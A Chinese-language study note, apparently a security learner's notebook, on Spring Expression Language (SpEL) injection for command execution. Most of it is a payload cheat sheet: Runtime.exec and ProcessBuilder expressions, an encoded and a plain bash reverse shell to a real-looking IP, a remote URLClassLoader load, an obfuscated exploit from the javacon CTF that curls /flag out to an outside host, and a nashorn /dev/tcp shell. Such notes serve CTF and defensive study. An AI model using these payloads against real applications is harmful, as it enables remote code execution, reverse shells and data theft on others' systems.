## 原理

Spring 表达式语言（简称“SpEL”）是一种强大的表达式语言，支持在运行时查询和操作对象图，但提供方法调用和基本的字符串模板功能，有点类似php中的eval，但不是执行任意代码，以下是一段会执行的spel的示例代码

```
public class test {
    static String val = "new java.lang.ProcessBuilder(\"calc\").start()";//将会执行的代码

    public static void main(String[] args) {
        spel(val);
    }
    public static String spel(String input){
        SpelExpressionParser parser = new SpelExpressionParser(); // 创建 SpEL 表达式解析器
        Expression exp = parser.parseExpression(input);// 解析输入的表达式
        String result = exp.getValue().toString();///执行命令，获取表达式执行结果，并将其转换为字符串，
        return result;
    }
}
```

![image-20231218211318117](F:\笔记\WEB\Java\SpEl命令执行.assets\image-20231218211318117.png)

能执行的语句：

在linux中Runtime中exec对复杂一点的命令执行不了,我们需要将其参数改成如下

```
new String[]{"/bin/bash\","-c","xxxxx"}
```

推荐一个网站[Runtime.exec Payload Generater | AresX's Blog (ares-x.com)](https://ares-x.com/tools/runtime-exec)

![image-20231218210130042](SpEl命令执行.assets\image-20231218210130042.png)

## ①

在JAVA中利用`Runtime`和`ProcessBuilder`类来使用Java执行Shell命令和脚本

```java
Process process = Runtime.getRuntime().exec("ping");
```

`T` 是 Spring Expression Language（SpEL）中的一个特殊运算符，用于获取类的引用，通过 `T` 运算符，可以在 SpEL 中访问类的静态方法、字段和嵌套类`T(java.lang.Runtime)` 表示获取 `java.lang.Runtime` 类的引用，然后使用这个引用来调用 `getRuntime()` 方法

```java
T(java.lang.Runtime).getRuntime().exec('calc.exe')

T(java.lang.Runtime).getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8zOS4xMDcuKioqLioqKi85MDAyIDA+JjE=}|{base64,-d}|{bash,-i}")
```

#### 注意

exec只能以字符串数组的形式执行命令

```
String[] command = {"bash","-c","bash -i >& /dev/tcp/8.130.20.254/12345 0>&1"};
Process process = Runtime.getRuntime().exec(command);
```

https://www.jianshu.com/p/ae3922db1f70

## ②

`new ProcessBuilder()`: 创建一个 `ProcessBuilder` 对象，用于构建和启动一个新的进程。构造函数接受一个字符串数组，其中包含要执行的命令和参数，`.start()`: 调用 `ProcessBuilder` 对象的 `start()` 方法来启动新进程，该进程将执行给定的命令

```
new java.lang.ProcessBuilder("calc").start()

((ProcessBuilder)Class.forName("java.lang.ProcessBuilder").getConstructor(List.class).newInstance(Arrays.asList("calc.exe"))).start();
```

## ③

`java.io.BufferedReader()`: 创建一个 `BufferedReader` 对象，用于缓冲字符输入流并提供更方便的读取方法

`java.io.InputStreamReader()`: 创建一个 `InputStreamReader` 对象，它用于将输入流的字节转换为字符，可以使用 `gbk` 字符编码来读取流中的字符

`.getInputStream()`: 获取新进程的标准输出流，用于从进程读取输出的流

```java
payload=new java.io.BufferedReader(new java.io.InputStreamReader(new ProcessBuilder("cmd", "/c", "whoami").start().getInputStream(), "gbk")).readLine()

new java.io.BufferedReader(new java.io.InputStreamReader(new ProcessBuilder("cmd", "/c", "whoami").start().getInputStream(), "gbk")).readLine()
```

## ④

其它的一些poc

```
"T(javax.script.ScriptEngineManager).getEngineByName(\"nashorn\").eval(\"s=[1];s[0]='calc';java.lang.Runtime.getRuntime().exec(s);\")"
```

```
"new java.net.URLClassLoader(new java.net.URL[]{new java.net.URL('http://127.0.0.1:8888/')}).loadClass(\"evil\").getConstructors()[0].newInstance()"
```

```
new java.util.Scanner(new java.lang.ProcessBuilder("cmd", "/c", "dir", ".\\").start().getInputStream(), "GBK").useDelimiter("asfsfsdfsf").next()
```

```
${new java.lang.ProcessBuilder(new java.lang.String(new byte[]{99,97,108,99})).start()}
```

#### trick：

来自p神的题目Code-Breaking Puzzles — javacon：https://www.leavesongs.com/media/attachment/2018/11/23/challenge-0.0.1-SNAPSHOT.jar

```
package com.example.p_challenge;

import com.example.p_challenge.tool.UserConfig;

public class exp {
    public static void main(String[] args) {
        String payload="#{T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"ex\"+\"ec\",T(String[])).invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"getRu\"+\"ntime\").invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\")),new String[]{\"/bin/bash\",\"-c\",\"curl http://8.130.20.254:12345/`cat /flag|base64|tr '\\n' '-'`\"})}";
        UserConfig userConfig = new UserConfig();
        userConfig.username=payload;
        System.out.println(userConfig.encryptRememberMe());
    }
}
我们正常执行方法是 [1].method([2], [3], [4]...) ，其实在反射里就是method.invoke([1], [2], [3], [4]...)
其他的：
可以将T(String)换为''

#{T(javax.script.ScriptEngineManager).newInstance()
    .getEngineByName("nashorn")
        .eval("s=[3];s[0]='/bin/bash';s[1]='-c';s[2]='ex"+"ec 5<>/dev/tcp/1.2.3.4/2333;cat <&5 | while read line; do $line 2>&5 >&5; done';java.la"+"ng.Run"+"time.getRu"+"ntime().ex"+"ec(s);")}

这里为什么需要加#{…} 呢：
#{…} SpEL使用 #{...} 作为定界符，所有在大括号中的字符都将被认为是 SpEL表达式,用于执行SpEl表达式，并将内容赋值给属性
${…} 主要用于加载外部属性文件中的值
```

改变remember-me的值，服务器上就可以收到请求

![image-20231218211823043](F:\笔记\WEB\Java\SpEl命令执行.assets\image-20231218211823043.png)

推荐博客：https://boogipop.com/2023/08/06/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E5%8F%8A%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/#ClassLoader

https://www.cnblogs.com/bitterz/p/15206255.html#%E5%89%8D%E8%A8%80

http://rui0.cn/archives/1043
